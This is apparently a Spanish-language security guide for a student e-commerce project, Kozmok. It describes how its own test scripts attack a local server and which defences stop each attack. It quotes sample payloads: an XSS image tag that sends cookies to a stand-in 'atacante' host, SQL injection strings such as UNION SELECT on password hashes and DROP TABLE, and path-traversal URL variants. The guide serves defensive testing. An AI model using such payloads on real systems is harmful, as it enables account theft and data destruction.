# Seguridad de Kozmok (Etapa 5)

Guía para la **defensa**: qué ataques se prueban, cómo se hacen contra nuestro propio servidor y qué defensa los detiene. Todo se puede demostrar en vivo con los scripts de `kozmok/pruebas-seguridad/` o a mano con el navegador, `curl` o Postman.

> Los ataques se hacen **solo contra nuestro propio servidor**: en la misma computadora (`http://localhost:3000`) o en la red local, por ejemplo por Wi-Fi o por el hotspot de un celular (`http://192.168.x.x:3000`). Los scripts se niegan a atacar cualquier otra dirección si no se les pasa `--objetivo-propio`.

## Resumen

| Ataque | Qué intenta el atacante | Qué lo detiene | Dónde se ve |
|---|---|---|---|
| **Fuerza bruta** | Probar muchas contraseñas hasta atinarle | Bloqueo de la cuenta tras 5 fallos (15 min), bloqueo de IP tras 20 fallos (30 min), máximo 15 intentos por minuto, retraso progresivo, bcrypt | Panel → Cuenta → **Seguridad** (Intentos y Bloqueos) |
| **Bots que prueban contraseñas** | Automatizar logins, registros y recuperaciones | Google reCAPTCHA en login, registro y recuperar contraseña | Seguridad → Eventos (“Captcha”) |
| **Contraseña robada o adivinada** | Entrar con la contraseña correcta de otra persona | Verificación en dos pasos (app autenticadora o código por correo): obligatoria en el panel, opcional en la tienda | Seguridad → Eventos (“Verificación en dos pasos”) |
| **Relleno de credenciales** | Una contraseña filtrada contra muchas cuentas | Límite por conexión y bloqueo de IP | Seguridad → Intentos (IPs con más fallos) |
| **Robo de sesión** | Copiar la cookie y usarla en otro navegador | Cookie HttpOnly + SameSite=Strict, token aleatorio guardado como hash, sesión atada al navegador, vencimiento, revocación al salir | Seguridad → Eventos (“Sesión robada”) |
| **Token falsificado** | Fabricar el token (la versión anterior usaba Base64 `cliente:1:…`) | Tokens aleatorios de 256 bits validados contra la tabla `sesiones` | Seguridad → Eventos (“Token falso”) |
| **Robo de credenciales por XSS** | Meter `<script>` o `<img onerror>` para leer la cookie | Limpieza de HTML en toda entrada, escape al mostrar, CSP `connect-src 'self'`, cookie HttpOnly | Seguridad → Eventos (“XSS”) |
| **Robo de la base de datos** | Llevarse la tabla de clientes | Contraseñas con bcrypt; sesiones y enlaces de recuperación solo como hash SHA-256 | — |
| **Inyección SQL** | `' OR '1'='1`, `UNION SELECT`, `; DROP TABLE` | Consultas parametrizadas en todo el servidor + filtro que bloquea y registra + ids numéricos validados + errores de la base ocultos | Seguridad → Eventos (“Inyección SQL”) |
| **CSRF** | Que otro sitio mande una petición con la sesión de la víctima | Cookie SameSite=Strict y verificación del `Origin` | Seguridad → Eventos (“CSRF”) |
| **IDOR** | Cambiar el id de la URL para ver datos de otro cliente | Cada ruta compara el id con el de la sesión | Seguridad → Eventos (“Acceso a datos ajenos”) |
| **Encontrar el panel** | Escribir `/admin/login.html` (o variantes) para llegar al login del equipo y atacarlo | Entrada en una dirección secreta de 144 bits (`PANEL_RUTA`); las direcciones conocidas dan el mismo 404 que una inventada; sin sesión ninguna pantalla del panel se entrega | Seguridad → Eventos (“Intento de abrir el panel por su dirección pública”) |
| **Robo de rol** | Cambiar el rol guardado en el navegador (p. ej. Logística → admin) para abrir pantallas de otro rol | El servidor valida el rol de la sesión en cada pantalla y en cada llamada a la API; el rol del navegador no cuenta | Regresa a su inicio; la API responde 403 |

## Cómo correr las pruebas

### Antes de la primera vez: cuenta de prueba

La base no trae clientes de ejemplo, así que las pruebas necesitan una cuenta de **cliente** creada en la tienda solo para esto:

1. En la tienda, *Crear cuenta* con un correo al que tengas acceso (llega un código para confirmarlo). Con Gmail sirve agregar `+pruebas`: `tucorreo+pruebas@gmail.com` llega a tu bandeja normal y la tienda la toma como otra cuenta.
2. **No** le actives la verificación en dos pasos (los scripts no pueden escribir el código).
3. Agrégala una vez al `.env` (junto a `server.js`):

```
PRUEBA_CORREO=tucorreo+pruebas@gmail.com
PRUEBA_PASSWORD=LaContraseñaDeEsaCuenta
```

También se puede pasar en cada corrida: `npm run prueba:seguridad -- --correo=… --password=…` (en PowerShell, si la contraseña lleva `#`, `$` o `&`, va entre comillas simples).

No uses tu cuenta de cliente de siempre: la prueba de fuerza bruta la bloquea a propósito (los scripts la desbloquean al terminar).

### Antes de una demostración: empezar en limpio

```bash
npm run desbloquear -- --todo
```

Levanta los bloqueos **y borra la bitácora de intentos y eventos**. Sirve por dos cosas:

- El bloqueo cuenta los intentos fallidos de los **últimos 15 minutos**. Si acabas de correr las pruebas, esos fallos siguen contando aunque hayas desbloqueado, y en la siguiente corrida la cuenta se bloquea antes (el primer intento ya dice “Te quedan 3” en vez de 4). Con `--todo` la demo muestra la secuencia completa desde cero.
- El panel, *Cuenta → Seguridad*, queda vacío y solo aparece lo que se ataque durante la demo.

`npm run desbloquear` (sin `--todo`) solo levanta los bloqueos y conserva el historial.

### Correr las pruebas

Con el servidor encendido (`npm start` dentro de `kozmok/`), en otra terminal:

```bash
cd kozmok
```

```bash
npm run prueba:seguridad
```

Antes de empezar levanta bloqueos viejos y comprueba que la cuenta de prueba entra; si no puede, dice por qué (contraseña equivocada, verificación en dos pasos activada, cuenta bloqueada o captcha) y no corre nada, para no dar resultados falsos. Luego corre las tres pruebas en orden y al final levanta los bloqueos que quedaron. Cada línea dice **✔ DEFENDIDO** o **✘ VULNERABLE**. También se pueden correr por separado:

```bash
npm run prueba:fuerza-bruta
```

```bash
npm run prueba:sqli
```

```bash
npm run prueba:sesion
```

Después de una demostración, para quitar bloqueos de cuentas e IPs (por ejemplo si la IP de la computadora quedó bloqueada):

```bash
npm run desbloquear
```

`npm run desbloquear -- --todo` además borra la bitácora (ver *Antes de una demostración*).

**Con reCAPTCHA activado** (llaves en `.env`): al arrancar, el servidor genera un pase de pruebas en `kozmok/.pruebas-token` (fuera de git). Los scripts lo usan solo si corren en la misma computadora del servidor, y el servidor solo lo acepta desde ahí; así se prueban el bloqueo de cuentas y las sesiones sin marcar la casilla. Desde cualquier otra computadora el captcha se sigue pidiendo.

### Atacar por Wi-Fi desde otra computadora (más realista)

Así el ataque viaja por la red, como el de un atacante de verdad, y en el panel se ve la IP de la computadora atacante.

1. **Servidor:** conecta su computadora a una red Wi-Fi o al **hotspot de un celular** (sirve con los datos móviles: la red local la crea el celular) y corre `npm start`. La consola muestra la dirección, por ejemplo `http://192.168.43.20:3000`. En Windows permite Node.js en *Redes privadas* cuando salga el aviso del Firewall.
2. **Atacante:** otra computadora conectada a **la misma red**, con Node.js 18+ y una copia del repositorio (no hace falta `npm install`). Dentro de `kozmok/`:

```bash
node pruebas-seguridad/todas.js http://192.168.43.20:3000
```

(o cada una: `node pruebas-seguridad/1-fuerza-bruta.js http://192.168.43.20:3000 --ip`).

Si el servidor tiene reCAPTCHA activado, desde la otra computadora el captcha frena los inicios de sesión antes que el bloqueo de cuentas. Para mostrar el bloqueo en la demo por Wi-Fi, quita `RECAPTCHA_SITE_KEY` y `RECAPTCHA_SECRET_KEY` del `.env` del servidor y reinícialo (vuelve a ponerlas al terminar).

3. **Proyector:** en la computadora del servidor abre el panel → *Cuenta → Seguridad*: aparecen los intentos, el bloqueo de la cuenta (y de la IP con `--ip`), la inyección SQL y la sesión robada, con la IP del atacante.

Desde la otra computadora no se puede tocar la base del servidor, así que la comprobación "si se roban la base de datos" se omite y los bloqueos no se levantan solos: al terminar, corre `npm run desbloquear` en el servidor o usa **Desbloquear** en *Seguridad → Bloqueos*.

> Solo funciona dentro de la misma red. Desde internet (otro celular con sus datos móviles, fuera del hotspot) no se llega al servidor: la compañía telefónica no deja entrar conexiones a los celulares, y abrir el servidor a internet no es parte de la demo.

## 1. Fuerza bruta

**Ataque.** `pruebas-seguridad/1-fuerza-bruta.js` prueba un diccionario de contraseñas contra la cuenta de prueba; la contraseña correcta va al final. Antes comprueba que la respuesta es la misma para un correo registrado y uno inexistente, y al final que un correo que no existe también se “bloquea” tras los mismos intentos (el bloqueo no delata qué cuentas existen). Con `--ip` también hace *relleno de credenciales*: la misma contraseña contra 25 cuentas.

```bash
npm run prueba:fuerza-bruta -- --ip
```

**Qué se ve.** Los primeros intentos regresan 401 y avisan cuántos quedan; el 5º responde **429: cuenta bloqueada 15 minutos**, y aunque después llegue la contraseña correcta, **no entra**. En la ráfaga contra muchas cuentas aparece el límite por minuto (429) y la IP queda bloqueada.

**A mano.** En `/login.html` escribe 5 veces mal la contraseña de una cuenta: el mensaje cambia a “Cuenta bloqueada temporalmente…”. En el panel, *Seguridad → Bloqueos*, aparece el bloqueo con el botón **Desbloquear**.

**Defensas (en `kozmok/seguridad.js`).**
- `registrarFallo`: cada intento queda en `intentos_login`; con 5 fallos seguidos de una cuenta se crea un registro en `bloqueos` (tipo cuenta) y con 20 desde una IP, otro (tipo IP).
- `limitador`: máximo 15 peticiones por minuto por IP a login, registro y recuperación (en memoria).
- Retraso progresivo de 250 ms por fallo y bcrypt (costo 12) hacen lento cada intento.
- `compararPassword` usa un hash de relleno cuando el correo no existe: misma respuesta y mismo tiempo, así no se puede saber qué correos están registrados.
- Política de contraseñas (8+ caracteres, mayúsculas y minúsculas, número, símbolo, no de las más comunes, sin el correo ni el nombre).

Los límites se ajustan en `.env`: `MAX_FALLOS_CUENTA`, `MAX_FALLOS_IP`, `BLOQUEO_CUENTA_MIN`, `BLOQUEO_IP_MIN`.

## 2. Robo de credenciales y de sesión

**Ataque.** `pruebas-seguridad/3-robo-de-sesion.js`:
1. Fabrica un token Base64 `cliente:1:…` (con la versión anterior eso bastaba para entrar a cualquier cuenta).
2. Inicia sesión como la víctima, copia su cookie `kz_sesion` y la usa con otro navegador.
3. Cierra sesión y vuelve a usar la cookie copiada.
4. Manda un ticket con `<img src=x onerror="fetch('https://atacante/?c='+document.cookie)">`.
5. Manda una recarga del monedero con `Origin: https://sitio-malicioso`.
6. Pide el perfil, el carrito y los pedidos de otro cliente.
7. Lee la base: la contraseña solo está como hash bcrypt.

**Qué se ve.** Todo regresa 401/403. En el paso 2, además, **la sesión de la víctima se revoca**: el servidor asume que la cookie fue robada.

**A mano (robo de cookie).** Inicia sesión en Chrome, abre las herramientas de desarrollador → Application → Cookies y copia `kz_sesion`. En la consola escribe `document.cookie`: la cookie **no aparece** (HttpOnly). Pégala en otro navegador o en Postman con otro User-Agent: responde 401 y en *Seguridad → Eventos* aparece “Sesión robada”.

**Defensas.**
- La sesión es un token aleatorio de 256 bits en una cookie `HttpOnly; SameSite=Strict` (y `Secure` con `COOKIE_SEGURA=1` en HTTPS). En `localStorage` ya no hay tokens.
- En la tabla `sesiones` solo está el **hash SHA-256** del token; con una copia de la base no se pueden usar.
- Cada sesión guarda la huella del navegador que la abrió; si llega desde otro, se rechaza y se revoca.
- Vencen (7 días la tienda, 8 h el panel), se cierran por inactividad (2 días / 2 horas), se revocan al cerrar sesión, al cambiar o restablecer la contraseña. El cliente ve y cierra sus sesiones en **Mi cuenta → Seguridad**.
- Recuperación de contraseña con enlace de un solo uso que vence en 30 min, sin revelar si el correo existe.
- Contra XSS: `sanitizarEntrada` quita etiquetas y caracteres peligrosos de todo lo que entra (menos contraseñas), las pantallas escapan con `escHTML()` lo que muestran, y la cabecera **CSP** con `connect-src 'self'` impide que un script mande datos a otro servidor. También `X-Frame-Options: DENY`, `nosniff` y `Referrer-Policy`.
- Contra CSRF: cookie `SameSite=Strict` y `verificarOrigen` rechaza peticiones que modifican datos desde otro origen.
- Contra IDOR: `mismoCliente` y las consultas con `AND cliente_id = $2`; el detalle de pedidos, que antes era público, ahora exige sesión y ser el dueño.

## 3. Inyección SQL

**Ataque.** `pruebas-seguridad/2-inyeccion-sql.js` prueba:
- Login con `admin@kozmok.mx' OR '1'='1' --` y contraseñas con `' OR '1'='1`.
- Buscador con `' UNION SELECT id, email, password_hash FROM usuarios --`, `'; DROP TABLE clientes; --` y `' AND pg_sleep(5) --`.
- Ids en la URL: `/api/catalogo/1 OR 1=1`, `/api/catalogo/1;DROP TABLE productos`.
- `ORDER BY` manipulado.

**Qué se ve.** El filtro responde **400: “se detectó un intento de inyección SQL”** y lo registra. Al final la prueba confirma que el catálogo sigue completo.

**Demostrar que la defensa real son las consultas parametrizadas.** Arranca el servidor con el filtro solo registrando:

```bash
FILTRO_SQLI=registrar npm start
```

(en Windows pon `FILTRO_SQLI=registrar` en el archivo `.env`). Vuelve a correr `npm run prueba:sqli`: ahora el buscador responde 200 con **cero resultados** (el texto se buscó literalmente), el login responde “formato no válido” y nada se borra. Ningún dato interno ni error de PostgreSQL llega al atacante.

**Defensas.**
- **Consultas parametrizadas**: en `server.js` todo valor del usuario va como `$1, $2…` en `pool.query(sql, [valores])`. Lo único que se arma con texto son condiciones con marcadores y valores de listas blancas (por ejemplo, el `ORDER BY` del catálogo solo puede ser por nombre o por novedades: cualquier otro valor se ignora).
- `filtroInyeccionSQL`: detecta tautologías, `UNION SELECT`, consultas apiladas, comentarios, `pg_sleep`, lectura de `information_schema`, etc.
- `app.param`: todo `:id` debe ser numérico.
- `asyncRoute` y `mensajeSeguro`: el error de la base nunca se manda al cliente (antes la respuesta incluía `detalle: err.message`).
- Validación de formatos (correo, teléfono, montos, fechas) antes de consultar.

## 4. Fraude interno y de clientes (control interno)

Las reglas viven en `kozmok/db/control_interno.sql` (se aplica solo al arrancar) para
que se cumplan aunque alguien llame a la API directo o tenga acceso a la base:

- **Fecha del servidor**: pedidos y movimientos de puntos, monedero y ERP guardan
  `CURRENT_TIMESTAMP`; la fecha que mande el cliente o el empleado se ignora.
- **Inventario: dos fechas**. `fecha` = hora real del registro (servidor, inmutable) y
  `fecha_movimiento` = cuándo dice el empleado que pasó (se puede indicar al registrar y
  corregir con motivo). Cada corrección queda en `movimientos_inventario_fechas` (anterior,
  nueva, quién, por qué, hora real), tabla de solo agregar. No se aceptan fechas futuras ni
  de más de un año. Un empleado solo corrige sus propios movimientos.
  **La hora real y el historial no se muestran en el panel ni salen por la API**: quedan
  solo en la base para revisar incoherencias, por ejemplo:

  ```sql
  -- Movimientos capturados 1 día o más después de la fecha que dicen, o con fecha corregida
  SELECT m.id, p.nombre, m.tipo, m.cantidad, m.fecha_movimiento, m.fecha AS registrado,
         u.nombre AS registro, uc.nombre AS corrigio_fecha, m.fecha_cambiada_en
  FROM movimientos_inventario m
  JOIN productos p ON p.id = m.producto_id
  LEFT JOIN usuarios u ON u.id = m.usuario_id
  LEFT JOIN usuarios uc ON uc.id = m.fecha_cambiada_por
  WHERE m.fecha - m.fecha_movimiento >= INTERVAL '1 day' OR m.fecha_cambiada_por IS NOT NULL
  ORDER BY m.fecha DESC;

  -- Historial de correcciones de fecha
  SELECT f.*, u.nombre FROM movimientos_inventario_fechas f
  LEFT JOIN usuarios u ON u.id = f.usuario_id ORDER BY f.fecha DESC;
  ```
- **Solo agregar**: los movimientos no se editan ni se borran; un error se corrige con
  un movimiento compensatorio. Solo cambia el estado de un pendiente.
- **Pedidos sellados**: folio, fecha y montos inmutables; estados solo hacia adelante;
  entregado y cancelado son finales; un pago registrado no se deshace.
- **Bitácora encadenada** (`auditoria`): quién, cuándo, antes y después, con huella
  SHA-256 que incluye la del registro anterior. Panel → Auditoría → *Verificar integridad*.
- **Segunda firma**: bajas de inventario ≥ `BAJA_UMBRAL_PIEZAS` / `BAJA_UMBRAL_VALOR` o
  por robo, ajustes de monedero > `MONEDERO_AJUSTE_UMBRAL`, confirmación de pagos manuales
  (folio único, quien captura no confirma).
- **Clientes**: puntos negativos al cancelar un pedido cuyos puntos ya se usaron, máximo de
  piezas por producto y de pedidos sin pagar, límites del monedero (por operación, día, mes,
  saldo máximo), correo verificado para recargar, estados activo/congelado/bloqueado con motivo.

Los casos de fraude (empleados E1–E10, clientes C1–C9) y su cláusula están en el documento
del proyecto; las reglas para el cliente en la tienda, `terminos.html`.

## 5. Panel oculto y robo de roles

**Ataque.** Quien conoce el proyecto sabe que el panel estaba en `/admin/login.html`: con solo agregar eso a la dirección llegaba al login del equipo para probar contraseñas. Y quien ya trabaja en el panel (por ejemplo, Logística) puede abrir las herramientas del navegador, cambiar su rol a `admin` en `localStorage` (`kz_usuario`) y escribir la dirección de una pantalla que no le toca, como *Cuentas y equipo*.

**Qué se ve.**
- `/admin/login.html`, `/admin/LOGIN.HTML`, `/admin/%6Cogin.html`, `/admin/js/../login.html`, `/admin/` y cualquier otra pantalla del panel sin sesión responden **la misma página 404** que una dirección inventada (mismo código y mismo tamaño): no se puede saber que el panel existe. Cada intento de abrir el login por su dirección pública queda en *Seguridad → Eventos*.
- La entrada real es `http://localhost:3000/admin/<PANEL_RUTA>/`, un código aleatorio de 24 caracteres que la consola muestra al arrancar y que vive en el `.env` (no se sube a GitHub). De ahí salen también `…/recuperar`, `…/restablecer` y `…/activar` (los correos del equipo ya traen esos enlaces).
- Con el rol cambiado en el navegador, el servidor revisa el rol **de la sesión** y regresa a la persona a su inicio; la API responde 403 y el menú vuelve a su rol real al recargar.

**A mano.**
```bash
curl -i http://localhost:3000/admin/login.html          # 404, igual que /no-existe.html
curl -i http://localhost:3000/admin/dashboard.html      # 404 sin sesión
curl -i http://localhost:3000/admin/<PANEL_RUTA>/        # 200: la entrada del equipo
```

**Defensas.**
- `panel-oculto.js` va **antes** de los archivos estáticos: ninguna página de `/admin` se sirve directo de la carpeta. La ruta se revisa como la entendería el servidor de archivos (decodificada, sin `..`, sin distinguir mayúsculas, como en Windows), así que las variantes no se cuelan.
- La dirección secreta se compara en tiempo constante y tiene 144 bits al azar: no se puede adivinar. Para cambiarla basta con editar `PANEL_RUTA` en el `.env` y reiniciar; la anterior deja de servir.
- Cada pantalla del panel pide la misma clave de permiso que usa el menú (`renderAdminSidebar('…')`) y el servidor la valida con `permisos.js` contra el rol guardado en la base, no contra lo que diga el navegador. La API ya hacía lo mismo con `PERMISOS_API`.
- Los correos del equipo (bienvenida, recuperar contraseña y notificaciones del panel) llevan el enlace por la entrada secreta. Para abrir una pantalla concreta usan `/admin/<PANEL_RUTA>/?next=/admin/soporte.html?ticket=5`: la cookie `SameSite=Strict` no viaja al dar clic desde el correo, así que la entrada revisa la sesión (o la pide) y luego abre esa pantalla. `next` solo acepta pantallas del panel, nunca otro sitio.
- Las páginas de acceso salen con `Cache-Control: no-store` y `X-Robots-Tag: noindex`, y `Referrer-Policy: same-origin` evita que la dirección secreta viaje a otros sitios.
- Esconder la entrada no reemplaza a las demás defensas: el login del panel sigue con bloqueo por intentos, captcha y verificación en dos pasos.

## Dónde está cada cosa

| Archivo | Qué contiene |
|---|---|
| `kozmok/seguridad.js` | Cabeceras/CSP, límites, bloqueos, sesiones, filtros SQL y XSS, política de contraseñas |
| `kozmok/panel-oculto.js` | Entrada secreta del panel (`PANEL_RUTA`) y pantallas del panel solo con sesión y rol |
| `kozmok/server.js` | Rutas `/api/auth/*`, uso de los middlewares, rutas del panel `/api/admin/seguridad/*` |
| `kozmok/db/database.sql` | Tablas `sesiones`, `intentos_login`, `bloqueos`, `eventos_seguridad`, `recuperaciones`, `correos_salida` |
| `kozmok/public/admin/seguridad.html` | Tablero (Panel → Cuenta → Seguridad, solo administrador): eventos, intentos, bloqueos, sesiones activas y correos enviados |
| `kozmok/public/seguridad.html` | Seguridad de la cuenta del cliente: contraseña, sesiones y actividad |
| `kozmok/public/recuperar.html`, `restablecer.html` | Recuperar la contraseña con enlace de un solo uso |
| `kozmok/pruebas-seguridad/` | Scripts de los ataques y `desbloquear.js` |
| `kozmok/.env.example` | Contraseña de la base y parámetros de seguridad (el `.env` real no se sube) |

## Limitaciones honestas

- El proyecto corre en HTTP local; en producción debe ir con HTTPS (`COOKIE_SEGURA=1` agrega `Secure` y HSTS).
- La dirección secreta del panel es una capa extra (oculta la puerta), no la cerradura: la protección real siguen siendo la contraseña, la verificación en dos pasos y los permisos por rol en el servidor. Los scripts de `/admin/js/` siguen siendo públicos porque la página de acceso los necesita antes de iniciar sesión; no traen datos ni la dirección secreta.
- El límite por minuto vive en memoria: se reinicia con el servidor. Los bloqueos de cuenta e IP sí quedan en la base.
- Un atacante puede bloquear a propósito la cuenta de alguien fallando 5 veces (es el costo del bloqueo); por eso dura solo 15 minutos y la persona puede entrar con “¿Olvidaste tu contraseña?”, que además levanta el bloqueo.
- Los correos salen por Gmail solo si se configuran `SMTP_USUARIO` y `SMTP_PASSWORD` en el `.env`; sin eso se guardan en el panel, *Cuenta → Seguridad → Correos enviados* (ahí está el enlace de recuperación durante la demo). La contraseña de aplicación de Gmail vive solo en el `.env`, que no se sube a GitHub.
- "Mantener sesión iniciada" (solo en la tienda) alarga la sesión a 30 días y la exime del cierre por inactividad; sigue atada al navegador que la abrió y se revoca al cerrar sesión o cambiar la contraseña. El panel no la tiene: su cookie es de sesión (se cierra al cerrar la pestaña o el navegador) y solo recuerda el correo de la cuenta, nunca la contraseña.
- La CSP todavía permite scripts escritos dentro del HTML (`'unsafe-inline'`) porque las pantallas los usan. Contra XSS la defensa principal es limpiar lo que entra y escapar lo que se muestra; la CSP evita que un script inyectado mande datos a otro servidor (`connect-src 'self'`). El siguiente paso sería pasar esos scripts a archivos `.js` y quitar `'unsafe-inline'`.
